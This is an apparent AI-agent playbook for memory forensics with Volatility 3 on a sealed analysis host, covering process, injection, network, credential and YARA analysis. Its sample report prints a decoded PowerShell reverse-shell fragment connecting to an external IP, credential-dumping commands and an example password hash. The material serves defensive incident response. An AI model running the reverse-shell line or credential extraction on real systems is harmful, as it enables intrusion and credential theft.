---
name: cb-memory-dumps-with-volatility
skill_id: cb-memory-dumps-with-volatility
journal_id: CB-SKL-083
description: Cold-box analyst playbook — Memory Dumps With Volatility. Analyzes RAM
  memory dumps from compromised systems using the Volatility framework to identify
  malicious processes, injected code, network connections, loaded modules, and extracted
  credentials. Supports Windows, Linux, and macOS memory fore
domain: cold-box
subdomain: malware-analysis
tier: core
case_profiles:
- memory
execution_mode: sift_runnable
artifact_platforms:
- any
host_platforms:
- linux
tags:
- malware
- memory-forensics
- Volatility
- RAM-analysis
- incident-response
cold_box_version: 2
inspired_by: analyzing-memory-dumps-with-volatility
---

# Memory Dumps With Volatility (cold-box)

> **Journal ID:** `CB-SKL-083` — cite this in every journal entry while following this playbook.

## Cold-box constraints (always)

- Evidence lives on the **sealed operation table** — read only through the viewport (`input_relpath`).
- **Never write** on `operation-table/`; tool output goes to `records/{case_id}/scratch/`.
- **Log this playbook** in the case journal with **`CB-SKL-083`** (`log_skill`) when you adopt it and at each major step.
- Every SIFT execution: `run_sift_tool` with **`purpose`**, **`why`**, and cite returned **`tool_id`** + **`audit_id`** in the journal.
- Prefer `list_sift_tools(verified_only=true)` — skip `[BAD — DO NOT USE]` tools.
- Load this playbook with `get_skill("cb-memory-dumps-with-volatility")`; do not treat markdown code blocks as direct shell commands.

## Agent loop

1. `suggest_skills(case_profile=...)` or `get_skill("cb-memory-dumps-with-volatility")` → note **`CB-SKL-083`**
2. `log_skill(case_id, journal_id="CB-SKL-083", action="adopted", note="...")`
3. `list_sift_tools(verified_only=true)` → pick tools from the map below
4. `describe_sift_tool(tool_id)` → `run_sift_tool(...)` → journal stdout with `CB-SKL-083` + `audit_id`
5. `log_skill(..., action="finding", note="...")` when recording conclusions; self-correct if outputs conflict


## When to use

- A compromised system's RAM has been captured and needs forensic analysis for malware artifacts
- Detecting fileless malware that exists only in memory without persistent disk artifacts
- Extracting encryption keys, passwords, or decrypted configuration from process memory
- Identifying process injection, DLL injection, or process hollowing in a compromised system
- Analyzing rootkit activity that hides from standard disk-based forensic tools

## Tool map (SIFT via MCP)

**Execution mode:** `sift_runnable` — SIFT tools below are available on this host.

| binary | tool_id | verified | available |
|--------|---------|----------|-----------|
| `powershell` | `SIFT-179` | no | no |
| `strings` | `SIFT-044` | yes | yes |
| `autopsy` | `SIFT-047` | no | yes |
| `pslist` | `SIFT-182` | no | no |
| `grep` | `SIFT-010` | yes | yes |
| `find` | `SIFT-009` | yes | yes |
| `yara` | `SIFT-045` | no | no |
| `file` | `SIFT-008` | yes | yes |

## Cold-box MCP examples

Use these instead of running shell blocks directly. Always log `{journal_id}` in purpose/why or via `log_skill`.

### `powershell` → `SIFT-179`

```json
{
  "tool_id": "SIFT-179",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] powershell per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `strings` → `SIFT-044`

```json
{
  "tool_id": "SIFT-044",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] strings per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `autopsy` → `SIFT-047`

```json
{
  "tool_id": "SIFT-047",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] autopsy per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `pslist` → `SIFT-182`

```json
{
  "tool_id": "SIFT-182",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] pslist per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `grep` → `SIFT-010`

```json
{
  "tool_id": "SIFT-010",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] grep per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `find` → `SIFT-009`

```json
{
  "tool_id": "SIFT-009",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] find per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `yara` → `SIFT-045`

```json
{
  "tool_id": "SIFT-045",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] yara per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

### `file` → `SIFT-008`

```json
{
  "tool_id": "SIFT-008",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-083] file per playbook step",
  "why": "Executing cb-memory-dumps-with-volatility \u2014 see Procedure section",
  "extra_args": []
}
```

## Journal logging

When you adopt this playbook, append to `records/{case_id}/{case_id}.md`:

```markdown
## {timestamp} — skill `CB-SKL-083` (`cb-memory-dumps-with-volatility`)

- **action:** adopted | step | finding | deferred | completed
- **note:** What you did or concluded under this playbook
- **related_audit_ids:** (optional) CB-… from run_sift_tool
```

Or call MCP: `log_skill(case_id, journal_id="{journal_id}", action="adopted", note="...")`

## Cold-box path translation

When the procedure below uses host paths, translate as follows:

| Procedure path | Cold-box equivalent |
|----------------|---------------------|
| `C:\Evidence\...` / `/cases/...` | `{input_relpath}` on the sealed table (via viewport) |
| `C:\Output\...` / `/analysis/...` | `records/{case_id}/scratch/` (tool stdout/files) |
| Live SIEM / cloud console steps | **Reference only** on cold-box — note capability gap in journal |

Do not copy evidence off the table except into `records/{case_id}/scratch/` via `run_sift_tool`.


## Procedure

## When to Use

- A compromised system's RAM has been captured and needs forensic analysis for malware artifacts
- Detecting fileless malware that exists only in memory without persistent disk artifacts
- Extracting encryption keys, passwords, or decrypted configuration from process memory
- Identifying process injection, DLL injection, or process hollowing in a compromised system
- Analyzing rootkit activity that hides from standard disk-based forensic tools

**Do not use** for disk image analysis; use Autopsy, FTK, or Sleuth Kit for disk forensics.

## Prerequisites

- Volatility 3 installed (`pip install volatility3`) with symbol tables for target OS
- Memory dump file acquired from the target system (using WinPmem, LiME, or DumpIt)
- Knowledge of the source OS version for correct profile/symbol selection
- Sufficient disk space (memory dumps can be 4-64 GB)
- YARA rules for scanning memory for known malware signatures
- Strings utility for extracting readable strings from memory regions

## Workflow

### Step 1: Identify the Memory Dump Profile

Determine the operating system and version from the memory dump:

```bash
# Volatility 3: Automatic OS detection
vol3 -f memory.dmp windows.info

# List available plugins
vol3 -f memory.dmp --help

# If symbols are needed, download from:
# https://downloads.volatilityfoundation.org/volatility3/symbols/

# For Volatility 2 (legacy):
vol2 -f memory.dmp imageinfo
vol2 -f memory.dmp kdbgscan
```

### Step 2: Enumerate Running Processes

List all processes and identify suspicious entries:

```bash
# List all processes
vol3 -f memory.dmp windows.pslist

# Process tree (parent-child relationships)
vol3 -f memory.dmp windows.pstree

# Scan for hidden/unlinked processes (rootkit detection)
vol3 -f memory.dmp windows.psscan

# Compare pslist vs psscan to find hidden processes
# Processes in psscan but not pslist are potentially hidden by rootkits

# Check for process hollowing
vol3 -f memory.dmp windows.pslist --dump
# Then verify the dumped EXE matches the expected binary on disk
```

```
Suspicious Process Indicators:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- svchost.exe not spawned by services.exe (wrong parent)
- csrss.exe/lsass.exe with unusual parent process
- Multiple instances of lsass.exe (should be only one)
- Processes with misspelled names (scvhost.exe, lssas.exe)
- cmd.exe or powershell.exe spawned by WINWORD.EXE or browser
- Processes running from unusual paths (%TEMP%, %APPDATA%)
- Processes with no parent (orphaned - parent terminated)
```

### Step 3: Detect Malicious Code Injection

Scan for injected code and process hollowing:

```bash
# Detect injected code in processes (malfind)
vol3 -f memory.dmp windows.malfind

# Malfind looks for:
# - Memory regions with PAGE_EXECUTE_READWRITE protection
# - Memory regions containing PE headers (MZ/PE signature)
# - VAD (Virtual Address Descriptor) anomalies

# Dump injected memory regions for analysis
vol3 -f memory.dmp windows.malfind --dump --pid 2184

# List loaded DLLs per process
vol3 -f memory.dmp windows.dlllist --pid 2184

# Detect hollowed processes by comparing mapped image to disk
vol3 -f memory.dmp windows.hollowfind

# Scan for loaded drivers (potential rootkit drivers)
vol3 -f memory.dmp windows.driverscan

# List kernel modules
vol3 -f memory.dmp windows.modules
```

### Step 4: Analyze Network Connections

Extract active and closed network connections:

```bash
# List all network connections (active and listening)
vol3 -f memory.dmp windows.netscan

# Output columns: Offset, Protocol, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner

# Filter for established connections to external IPs
vol3 -f memory.dmp windows.netscan | grep ESTABLISHED

# For older Windows (XP/2003):
vol3 -f memory.dmp windows.netstat

# Cross-reference PIDs with process list
# Suspicious: svchost.exe connected to external IP on non-standard port
# Suspicious: notepad.exe or calc.exe with network connections
```

### Step 5: Extract Artifacts and Credentials

Recover sensitive data from memory:

```bash
# Dump process memory for a specific PID
vol3 -f memory.dmp windows.memmap --dump --pid 2184

# Extract command-line history
vol3 -f memory.dmp windows.cmdline

# Extract environment variables
vol3 -f memory.dmp windows.envars --pid 2184

# Registry analysis (extract Run keys for persistence)
vol3 -f memory.dmp windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Run"

# Extract hashed/cached credentials
vol3 -f memory.dmp windows.hashdump
vol3 -f memory.dmp windows.cachedump
vol3 -f memory.dmp windows.lsadump

# Extract clipboard contents
vol3 -f memory.dmp windows.clipboard

# File extraction from memory
vol3 -f memory.dmp windows.filescan | grep -i "payload\|malware\|suspicious"
vol3 -f memory.dmp windows.dumpfiles --virtaddr 0xFA8001234560
```

### Step 6: Scan Memory with YARA Rules

Apply YARA signatures to detect known malware in memory:

```bash
# Scan entire memory dump with YARA rules
vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar

# Scan specific process memory
vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar --pid 2184

# Built-in YARA scan for common patterns
vol3 -f memory.dmp yarascan.YaraScan --yara-rules "rule FindC2 { strings: \$s1 = \"gate.php\" condition: \$s1 }"

# Scan for encryption key material
vol3 -f memory.dmp yarascan.YaraScan --yara-rules "rule AES_Key { strings: \$sbox = { 63 7C 77 7B F2 6B 6F C5 } condition: \$sbox }"
```

### Step 7: Timeline and Report Generation

Create an analysis timeline and compile findings:

```bash
# Generate comprehensive timeline
vol3 -f memory.dmp timeliner.Timeliner --output-file timeline.csv

# Timeline includes:
# - Process creation/exit times
# - Network connection timestamps
# - Registry modification times
# - File access times

# Export process list for reporting
vol3 -f memory.dmp windows.pslist --output csv > processes.csv

# Export network connections
vol3 -f memory.dmp windows.netscan --output csv > network.csv
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Memory Forensics** | Analysis of volatile memory (RAM) contents to identify running processes, network connections, and in-memory artifacts that may not exist on disk |
| **Process Hollowing** | Malware technique of creating a legitimate process in suspended state, replacing its memory with malicious code, then resuming execution |
| **Malfind** | Volatility plugin detecting injected code by identifying memory regions with executable permissions and PE headers in non-image VADs |
| **VAD (Virtual Address Descriptor)** | Windows kernel structure tracking memory regions allocated to a process; anomalies in VADs indicate injection or hollowing |
| **EPROCESS** | Windows kernel structure representing a process; rootkits unlink EPROCESS entries to hide processes from standard tools |
| **Pool Tag Scanning** | Memory forensics technique scanning for kernel object pool tags to find objects (processes, files, connections) even when unlinked |
| **Fileless Malware** | Malware that operates entirely in memory without creating files on disk; only detectable through memory forensics |

## Tools & Systems

- **Volatility 3**: Open-source memory forensics framework supporting Windows, Linux, and macOS memory analysis with plugin architecture
- **WinPmem**: Memory acquisition tool for Windows systems that creates raw memory dumps for offline analysis
- **LiME (Linux Memory Extractor)**: Loadable kernel module for capturing Linux system memory dumps
- **Rekall**: Alternative memory forensics framework with some unique analysis capabilities (discontinued but still useful)
- **MemProcFS**: Memory process file system allowing mounting memory dumps as file systems for intuitive analysis

## Common Scenarios

### Scenario: Detecting Fileless Malware After EDR Alert

**Context**: EDR detected suspicious PowerShell activity but the threat actor cleaned up disk artifacts. A memory dump was captured before the system was rebooted. The analysis needs to identify the malware, its persistence mechanism, and any lateral movement.

**Approach**:
1. Run `windows.pstree` to identify the process chain (which process spawned PowerShell)
2. Run `windows.malfind` to detect injected code in running processes
3. Dump the suspicious process memory and extract strings for C2 URLs
4. Run `windows.netscan` to identify network connections from the compromised processes
5. Run `windows.cmdline` to see what commands PowerShell executed
6. Scan with YARA rules for known malware families in the dumped process memory
7. Extract credentials with `hashdump` and `lsadump` to assess lateral movement risk

**Pitfalls**:
- Using the wrong symbol tables for the OS version (causes plugin failures or incorrect results)
- Not comparing `pslist` vs `psscan` output (missing rootkit-hidden processes)
- Ignoring legitimate processes that have been injected into (focus on malfind results, not just process names)
- Not extracting full process memory before concluding analysis (strings from process dump may reveal additional IOCs)

## Output Format

```
MEMORY FORENSICS ANALYSIS REPORT
===================================
Dump File:        memory.dmp
Dump Size:        16 GB
OS Version:       Windows 10 21H2 (Build 19044)
Capture Tool:     WinPmem 4.0
Capture Time:     2025-09-15 14:35:00 UTC

SUSPICIOUS PROCESSES
PID   PPID  Name              Path                                    Anomaly
2184  1052  svchost.exe       C:\Users\Admin\AppData\Temp\svchost.exe Wrong path
4012  2184  powershell.exe    C:\Windows\System32\powershell.exe      Child of fake svchost
3456  4012  cmd.exe           C:\Windows\System32\cmd.exe             Spawned by PowerShell

CODE INJECTION DETECTED (malfind)
PID 852 (explorer.exe):
  Address: 0x00400000  Size: 98304  Protection: PAGE_EXECUTE_READWRITE
  Header: MZ (embedded PE detected)
  SHA-256 of dump: abc123def456...

NETWORK CONNECTIONS
PID   Process         Local           Foreign              State
2184  svchost.exe     10.1.5.42:49152 185.220.101.42:443   ESTABLISHED
4012  powershell.exe  10.1.5.42:49200 91.215.85.17:8080    ESTABLISHED

EXTRACTED CREDENTIALS
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

COMMAND LINE HISTORY
PID 4012: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
  Decoded: $client = New-Object System.Net.Sockets.TCPClient("185.220.101.42",443)

YARA MATCHES
PID 2184: rule CobaltStrike_Beacon { matched at 0x00401200 }

TIMELINE
14:10:00  svchost.exe (PID 2184) created from C:\Users\Admin\AppData\Temp\
14:10:05  Network connection to 185.220.101.42:443 established
14:12:30  powershell.exe (PID 4012) spawned by svchost.exe
14:15:00  Code injection into explorer.exe (PID 852) detected
14:20:00  Credential dump from LSASS process
```

## Self-correction

- If a SIFT tool errors, read `describe_sift_tool` and pick an alternate from the tool map.
- If procedure steps require SIEM/cloud/live APIs, log `{journal_id}` + `action=deferred` with the gap.
- Do not override `[BAD — DO NOT USE]` tools.
- Mark inference vs confirmed in journal; tie confirmed findings to `audit_id`.

## Limits

- Playbooks guide reasoning; **confirmed findings require tool output** in scratch with matching `audit_id`.
- Reference-mode steps are not executable on cold-box until equivalent SIFT tooling exists.
